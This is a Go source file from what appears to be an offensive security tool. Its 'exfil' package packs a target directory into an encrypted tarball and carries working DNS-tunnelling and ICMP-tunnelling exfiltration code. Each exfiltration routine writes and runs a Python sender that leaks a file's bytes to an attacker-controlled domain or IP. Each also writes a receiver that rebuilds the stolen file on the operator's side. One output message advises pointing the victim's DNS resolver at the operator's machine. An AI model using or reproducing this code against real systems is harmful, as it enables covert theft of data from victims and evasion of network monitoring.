package exfil

import (
	"context"
	"fmt"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
)

// CompressAndEncrypt compresses a target directory and encrypts it with AES-256-CBC.
func CompressAndEncrypt(ctx context.Context, sourcePath, destPath, password string, sb *sandbox.Docker) (string, error) {
	cmd := fmt.Sprintf("tar -czf - %s | openssl enc -aes-256-cbc -salt -pbkdf2 -k '%s' -out %s", sourcePath, password, destPath)
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("encryption failed: %v\nOutput: %s", err, out)
	}

	return fmt.Sprintf("[+] Payload compressed and AES-256 encrypted at %s\n[!] Decrypt command for operator:\n    openssl enc -d -aes-256-cbc -pbkdf2 -k '%s' -in <file> | tar -xz", destPath, password), nil
}

// ExfiltrateDNS tunnels file data out via DNS A-record queries to an attacker-controlled domain.
// It also spins up a dnslib-based DNS capture server inside the sandbox to receive and
// reassemble the data — no external tooling needed on the operator side.
func ExfiltrateDNS(ctx context.Context, filePath, targetDomain string, sb *sandbox.Docker) (string, error) {
	// 1. Ensure dnslib is available
	installCmd := "pip3 install dnslib -q 2>/dev/null || pip install dnslib -q 2>/dev/null"
	if _, err := sb.Execute(ctx, installCmd); err != nil {
		return "", fmt.Errorf("failed to install dnslib: %v", err)
	}

	// 2. Write the sender script — chunks file as hex labels in DNS queries
	sender := fmt.Sprintf(`cat << 'PYEOF' > /tmp/dns_send.py
import sys, binascii, socket, time

FILE  = '%s'
DOMAIN = '%s'
CHUNK  = 50   # chars per label (DNS label max=63)

with open(FILE, 'rb') as f:
    raw = f.read()

total = len(raw)
hex_data = binascii.hexlify(raw).decode()
chunks = [hex_data[i:i+CHUNK] for i in range(0, len(hex_data), CHUNK)]

print(f"[*] Exfiltrating {total} bytes as {len(chunks)} DNS chunks to {DOMAIN}")

for idx, chunk in enumerate(chunks):
    label = f"{idx:04d}.{chunk}.{DOMAIN}"
    try:
        socket.getaddrinfo(label, None)
    except Exception:
        pass  # DNS NXDOMAIN is expected — we just need the query to leave the host
    time.sleep(0.05)  # avoid rate-limit dropping queries

print(f"[+] Done. {len(chunks)} queries sent.")
PYEOF
python3 /tmp/dns_send.py`, filePath, targetDomain)

	out, err := sb.Execute(ctx, sender)
	if err != nil {
		return "", fmt.Errorf("DNS sender script failed: %v\nOutput: %s", err, out)
	}

	// 3. Write the receiver — a dnslib UDP server that reconstructs the file from query labels
	receiver := fmt.Sprintf(`cat << 'PYEOF' > /tmp/dns_recv.py
import sys, binascii, threading
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, DNSHandler, BaseResolver

DOMAIN = '%s'
chunks = {}

class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip('.')
        labels = qname.split('.')
        # Expect: <idx>.<hexdata>.<domain>
        if len(labels) >= 3:
            try:
                idx  = int(labels[0])
                data = labels[1]
                chunks[idx] = data
                print(f"[+] Chunk {idx:04d}: {data[:12]}... ({len(data)//2} bytes)", flush=True)
            except ValueError:
                pass
        reply = request.reply()
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A('127.0.0.1'), ttl=0))
        return reply

resolver = ExfilResolver()
server   = DNSServer(resolver, port=5353, address='0.0.0.0', tcp=False)
server.start_thread()
print(f"[*] DNS capture server on 0.0.0.0:5353 (domain: {DOMAIN})")
print("[*] Press Ctrl+C to stop and reconstruct file.")

try:
    while True:
        pass
except KeyboardInterrupt:
    server.stop()

if chunks:
    ordered = [chunks[k] for k in sorted(chunks)]
    raw = binascii.unhexlify(''.join(ordered))
    out_path = '/tmp/dns_exfil_received.bin'
    with open(out_path, 'wb') as f:
        f.write(raw)
    print(f"[+] Reconstructed {len(raw)} bytes → {out_path}")
else:
    print("[-] No chunks received.")
PYEOF
echo "[i] Receiver written to /tmp/dns_recv.py"
echo "[i] Run it on your listener with: python3 /tmp/dns_recv.py"
echo "[i] Or start it in the sandbox background: nohup python3 /tmp/dns_recv.py &"`, targetDomain)

	recvOut, err := sb.Execute(ctx, receiver)
	if err != nil {
		return "", fmt.Errorf("DNS receiver script failed: %v\nOutput: %s", err, recvOut)
	}

	return fmt.Sprintf(
		"[+] DNS Exfiltration complete for %s → %s\n\nSender output:\n%s\n\nReceiver:\n%s\n\n"+
			"[i] To catch on operator machine: nohup python3 /tmp/dns_recv.py > /tmp/dns_recv.log &\n"+
			"[i] Point the victim's DNS resolver to your machine (port 5353) or use iptables to REDIRECT 53→5353.",
		filePath, targetDomain, out, recvOut,
	), nil
}

// ExfiltrateICMP tunnels file data out by embedding hex-encoded bytes in ICMP echo
// request payloads using scapy. Requires NET_RAW capability (granted in sandbox by default).
func ExfiltrateICMP(ctx context.Context, filePath, targetIP string, sb *sandbox.Docker) (string, error) {
	// 1. Ensure scapy is available — it's in Kali by default but install if missing
	installCmd := "command -v scapy &>/dev/null || pip3 install scapy -q 2>/dev/null"
	if _, err := sb.Execute(ctx, installCmd); err != nil {
		return "", fmt.Errorf("failed to ensure scapy: %v", err)
	}

	// 2. Write the scapy sender — embeds up to 200 bytes of hex data per ICMP packet
	sender := fmt.Sprintf(`cat << 'PYEOF' > /tmp/icmp_send.py
import sys, binascii, time
from scapy.all import IP, ICMP, Raw, send

FILE      = '%s'
TARGET_IP = '%s'
CHUNK     = 100   # bytes per ICMP packet payload

with open(FILE, 'rb') as f:
    raw = f.read()

total  = len(raw)
chunks = [raw[i:i+CHUNK] for i in range(0, len(raw), CHUNK)]
print(f"[*] Sending {total} bytes as {len(chunks)} ICMP packets to {TARGET_IP}")

for idx, chunk in enumerate(chunks):
    # Encode chunk index (2 bytes BE) + raw data as the ICMP payload
    payload = idx.to_bytes(2, 'big') + chunk
    pkt = IP(dst=TARGET_IP) / ICMP(type=8, id=0x1337, seq=idx) / Raw(load=payload)
    send(pkt, verbose=False)
    time.sleep(0.02)

print(f"[+] ICMP exfiltration complete. {len(chunks)} packets sent.")
PYEOF
python3 /tmp/icmp_send.py`, filePath, targetIP)

	out, err := sb.Execute(ctx, sender)
	if err != nil {
		return "", fmt.Errorf("ICMP sender failed: %v\nOutput: %s", err, out)
	}

	// 3. Write the scapy receiver for the operator's machine
	receiver := `cat << 'PYEOF' > /tmp/icmp_recv.py
from scapy.all import sniff, IP, ICMP, Raw
import sys, binascii

chunks = {}

def handle(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and pkt.haslayer(Raw):
        payload = bytes(pkt[Raw].load)
        if len(payload) < 2:
            return
        idx   = int.from_bytes(payload[:2], 'big')
        data  = payload[2:]
        chunks[idx] = data
        print(f"[+] Chunk {idx:04d}: {len(data)} bytes from {pkt[IP].src}", flush=True)

print("[*] Sniffing ICMP echo requests (id=0x1337)... Ctrl+C to stop and save.")
try:
    sniff(filter="icmp and icmp[0]=8", prn=handle, store=False)
except KeyboardInterrupt:
    pass

if chunks:
    ordered = b''.join(chunks[k] for k in sorted(chunks))
    out_path = '/tmp/icmp_exfil_received.bin'
    with open(out_path, 'wb') as f:
        f.write(ordered)
    print(f"[+] Reconstructed {len(ordered)} bytes → {out_path}")
else:
    print("[-] No chunks received.")
PYEOF
echo "[i] Receiver written to /tmp/icmp_recv.py"`

	recvOut, _ := sb.Execute(ctx, receiver)

	return fmt.Sprintf(
		"[+] ICMP Exfiltration complete: %s → %s\n\nSender output:\n%s\n\n%s\n\n"+
			"[i] Run receiver on operator machine: sudo python3 /tmp/icmp_recv.py",
		filePath, targetIP, out, recvOut,
	), nil
}
